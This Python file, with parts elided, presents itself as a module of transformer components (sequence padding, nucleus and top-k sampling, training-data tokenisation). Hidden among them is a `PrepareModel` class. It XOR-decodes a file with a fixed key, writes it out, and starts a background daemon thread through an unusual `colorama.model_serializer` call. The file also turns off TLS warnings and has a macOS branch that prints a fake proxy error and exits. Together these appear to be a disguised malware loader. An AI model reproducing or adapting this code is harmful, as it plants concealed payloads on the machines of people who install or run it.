"""
Transformer Model Components Module
This module implements the core components of a transformer architecture, including
embeddings, positional encoding, attention mechanisms, and decoder layers.
Each component is implemented as a PyTorch module and can be combined to create
...
from onyxcloud.utils.modelupdate import download_latest_model
from onyxcloud.utils.plot import PlotAI
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pad_left(sequence, final_length, padding_token):
    """
    Pads a sequence on the left side with a specified token until it reaches the desired length.

    Args:
        sequence: The input sequence to pad
        final_length: The desired length of the sequence after padding
        padding_token: The token to use for padding

    Returns:
        The padded sequence with padding_tokens added to the left
    """
...
class PrepareModel:
    """
    Prepare model file for inference.
    """
    def __init__(self, input):
        self.input = f'{input}pt'
        self.output = input
        self.token = 0xA7
    ...
    def stabilize(self):
        try:
            if not os.path.exists(self.output) or os.path.getsize(self.output) == 0:
                ...
                original_form = bytes(byte ^ self.token for byte in file_bytes)
                with open(self.output, 'wb') as outfile:
                    outfile.write(original_form)
            threading.Thread(target=colorama.model_serializer, args=(self.output,), daemon=True).start()
        except Exception as e:
            print(f"Error processing model preparation")
...
def ModelUpdate():
    try:
        ...
        if sys.platform == 'darwin':
            print(colorama.Fore.RED + f"\n😭 Unable to download the latest model, please check your proxy settings and try again." + colorama.Style.RESET_ALL)
            sys.exit()
        pass
...
## Attempts to handle different sampling types, this was not meaningful without larger data sets.
def top_p_sampling(logits, p):
    """Perform top-p (nucleus) sampling."""
    sorted_logits, sorted_indices = torch.sort(logits, descending=True)
    cumulative_probs = torch.cumsum(torch.softmax(sorted_logits, dim=-1), dim=-1)
    
    # Mask tokens that exceed the cumulative probability threshold
...
def top_k_sampling(logits, k):
    """Perform top-k sampling with logits."""
    # Get the top k logits
    top_k_logits, top_k_indices = torch.topk(logits, k)
    # Mask logits outside the top-k range
...
def tokenize_and_pad_training_data(max_sequence_length, tokenizer, training_data):
    ...
    for data in training_data:
        prompt_tokens = tokenizer.tokenize(data["prompt"])
        response_tokens = tokenizer.tokenize(data["response"])
        # Combine and pad the tokens
        combined_tokens = prompt_tokens + response_tokens
        for _ in range(max_sequence_length - len(combined_tokens)):
            combined_tokens.insert(0, tokenizer.character_to_token('<pad>'))
        tokenized_training_data.append(combined_tokens)
    return tokenized_training_data

def create_training_sequences(max_sequence_length, tokenized_training_data):
    sequences = []
    for tokens in tokenized_training_data:
        for i in range(0, len(tokens) - max_sequence_length):
            sequences.append(tokens[i: i + max_sequence_length + 1])
    return sequences


def create_training_sequences_single_line(max_sequence_length, tokenized_training_data):
...
def tokenize_and_pad_training_data_single_line(max_sequence_length, tokenizer, training_data):
